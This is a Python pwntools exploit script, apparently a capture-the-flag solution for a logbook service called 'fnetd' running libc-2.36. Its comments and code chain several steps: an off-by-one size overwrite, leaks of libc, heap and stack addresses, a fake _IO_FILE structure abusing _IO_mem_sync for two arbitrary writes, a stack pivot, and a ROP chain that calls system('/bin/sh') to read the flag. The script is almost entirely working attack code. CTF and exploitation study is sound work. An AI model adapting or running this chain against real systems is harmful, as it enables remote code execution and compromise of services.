import time
import socket
from pwnlib.util.packing import *
from pwn import *
import os
import sys

#Change this to the actual fnetd password used in the challenge
passw = "fnetd_password"

def read_until(s, token):
    """Reads from socket `s` until a string `token` is found in the response of the server"""
    buf = b""
    while True:
        data = s.recv(2048)
        buf += data
        if not data or token in buf:
            return buf
        
def add_command(s, size, name, content):
    """Sends a command to the server to add a log entry"""
    s.send(b"add\n")
    response = read_until(s, b"Size")
    s.send(size)
    response = read_until(s, b"name")
    s.send(name)
    response = read_until(s, b"content")
    s.send(content)



#This pwn works by first exploiting the rather obvious of by one error add_note() (When entering Log name),
#which allows us to overwrite the LSB of the size of the log entry. This increases the size by up to 0xfe bytes,
#which is more than enough to overwrite the _IO_FILE structure of the log entry. (Which is located just after
#the content_buffer(which has a maximum size of 0x100) on the heap)

#As read_note() relies on the size of the log entry to read the content, we can use this to leak the libc addresses contained
#in the subsequent File struct.

#This attack path is based on the _IO_mem_sync based primitive, introduced by un1c0rn-the-pwnie here: https://github.com/un1c0rn-the-pwnie/FSOPAgain
#The _IO_mem_sync primitive can be used to write *two* values to arbitrary memory locations (note that the second value
#is contrained, as it has to satisfy (val_to_be_written == fp->_IO_write_ptr - fp->_IO_write_base), where fp->_IO_write_base is the first, fully arbitrary value written by the primitive.)


#The exploit is (as the other proposed solutions) based on the fact that a files vtable can be overwritten
#However there are protections, to ensure that the vtable is not entirely faked (it has to lie within the _libc_IO_vtables range) (Except if foreign vtable is set appropiately, but this is kinda hard to do as it is protected by pointer_guard)
#This is why we use the _IO_mem_jumps vtable, which is a legal table instead of the _IO_file_jumps vtable, which is the one that is used by the File struct.
#We construct an entirely fake File struct within a content_buffer, and introduce this into the open File list (by setting the _chain variable 
#of an already existing File struct to point to our fake File struct), with the goal of calling _IO_mem_sync on the faked File struct upon closing
#off all open files by the exit routine.

#For this, we set the vtable pointer of our fake File struct in such a fashion, that on cleanup _IO_mem_sync instead of _IO_mem_overflow (I think, not 100% sure
#, the specific call is "call   QWORD PTR [r15+0x18]", where r15 contains the vtable [and vtable+0x18 normally contains the overflow function]) is called. 
#This will then eventually execute
# static int
# _IO_mem_sync (FILE *fp)
# {
#   struct _IO_FILE_memstream *mp = (struct _IO_FILE_memstream *) fp;
#   ...
#   *mp->bufloc = fp->_IO_write_base;
#   *mp->sizeloc = fp->_IO_write_ptr - fp->_IO_write_base;
#   return 0;
# }
#And as we control all of these values in our fake File struct, this will allow us to write two values to arbitrary memory locations.
#mp->bufloc and mp->sizeloc are simply and the end of the _IO_FILE_memstream
# struct _IO_FILE_memstream
# {
#   _IO_strfile _sf;
#   char **bufloc;
#   size_t *sizeloc;
# };

#I chose to use the two writes for a simple ROP chain, to pivot the stack pointer to another content_buffer containing a second ROP chain, which spawns a shell.
#This requires a stack leak, which the vuln graciously provides us with

        
context.update(arch="amd64", os="linux")
#Load libc
current_dir = os.path.dirname(os.path.abspath(__file__))
libc_path = os.path.join(current_dir, "libc-2.36.so")
if not os.path.isfile(libc_path):
    raise FileNotFoundError(f"libc-2.36.so not found in {current_dir}.")
libc = ELF(libc_path, checksec=False)




host = "localhost"
port = 1337

#Take arguments
if len(sys.argv) > 2:
    host = sys.argv[1]
    port = int(sys.argv[2])

s = socket.socket()
s.connect((host, port))
start = read_until(s, b"Pass")
s.send(passw.encode() + b'\n')
response = read_until(s, b"a command")
print(response)
print(response.split(b"0x")[1].split(b"\n")[0])

stack_leak = response.split(b"0x")[1].split(b"\n")[0]
stack_leak = int(stack_leak, 16)
print("stack_leak: ", hex(stack_leak))


add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), b"testtest content\n")
response = read_until(s, b"a command")


s.send(b"read\n")
response = read_until(s, b"ID")
s.send(b"0\n")
response_with_libc = read_until(s, b"a command")
libc_leak = response_with_libc.split(b"\xe1\x01")[1][6:][104:112] #Manually determined
libc_leak = int.from_bytes(libc_leak.strip(), byteorder='little')
print("libc_leak: ", hex(libc_leak))

libc_base = libc_leak - 0x1D3680 #Manually calculated from libc-2.36.so
print("libc_base: ", hex(libc_base))

heap_leak = response_with_libc.split(b"\xe1\x01")[1][6:][136:144]
print("heap_leak: ", heap_leak)
heap_leak = int.from_bytes(heap_leak.strip(), byteorder='little')
print("heap_leak: ", hex(heap_leak))

#Set libc base address to the calculated base address
libc.address = libc_base
#This exploit utilizes the _IO_mem_sync primitive to write two values, to initiate a ROP chain.
#First craft a fake FILE, which will be at the beggining of g_logbook[2]->content_buffer
fake_file = FileStructure(0)
gadget = libc_base + 0x2746a #0x000000000002746a : pop rsp ; ret
write_pointer = heap_leak + 0x470 + gadget #Will point to beginning of g_logbook[2]->content_buffer, due to "*mp->sizeloc = fp->_IO_write_ptr - fp->_IO_write_base;"
fake_file._IO_write_base = gadget
fake_file._IO_write_ptr = write_pointer
#for lock we just use g_logbook[0]->file_lock, as we will have shell before this becomes relevant
fake_file._lock = heap_leak - 0xE8 + 0x88 #Manually determined
fake_vtable = libc_base + 0x1CF220 + 0x48 #So that _IO_mem_sync will be called upon finishing (libc + 0x1CF220 is the address of _IO_mem_jumps [unexported])
fake_file.vtable = fake_vtable

fake_file_bytes = bytes(fake_file)
#Add bytes to bring size up to _IO_strfile
fake_file_bytes += p64(0) + p64(0)

#Add **buffloc (gadget will be written to this location)
fake_file_bytes += p64(stack_leak - 0x14C) #Manually determined, this is the saved rip for mem_sync, which we will replace with the gadget
print("saved rip location: ", hex(stack_leak - 0x14C))


#Add *sizelock (write pointer will be written to this location)
fake_file_bytes += p64(stack_leak - 0x144) #Just below the saved rip for mem_sync, where we will deposit the new rsp
#Add another word to get up to the size of the next chunk
fake_file_bytes += p64(0)

print("Length of fake_file: ", len(fake_file_bytes))


#Make another fake FILE, whose _chain member will point to our fake FILE, so that we our fake FILE is added to the File list
fake_file2 = FileStructure(0)
fake_file.flags = 0x0
fake_file2._lock = heap_leak + 0x330
fake_file2.vtable = libc.sym['_IO_file_jumps']
fake_file2.chain = heap_leak + 0x140 #Will point to g_logbook[1]->content_buffer 


print("Length of fake_file_bytes: ", len(fake_file_bytes))
#Writing the 0x1e1 before the fake file structure is necessery to defeat the anti-hacking check
add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), fake_file_bytes + p64(0x1e1) + bytes(fake_file2))
response = read_until(s, b"a command")


#Now add another log_entry containing the ROP chain code (upon closing our fake file, rsp will be set to g_logbook[2]->content_buffer, which will then be executed)
#ROP chain:
rop = p64(libc_base + 0x277e5) #0x00000000000277e5 : pop rdi ; ret
rop += p64(libc_base + 0x196031) #196030 002f6269 6e2f7368 00657869 74203000  ./bin/sh.exit 0.
rop += p64(libc.sym['system']) #system@libc
add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), rop)
response = read_until(s, b"a command")



#Trigger the shell by calling exit(), which will attempt to close the open FILE Chain, which will eventually cause 
#an attempt to close our faked FILE, which then will initiate an RSP Pivot, causing the rop chain to be executed and giving us a shell
s.send(b"exit\n")


#Give the server some time to spawn the shell
time.sleep(0.1)
s.send(b"get_flag\n")
response = read_until(s, b"")
print(response)










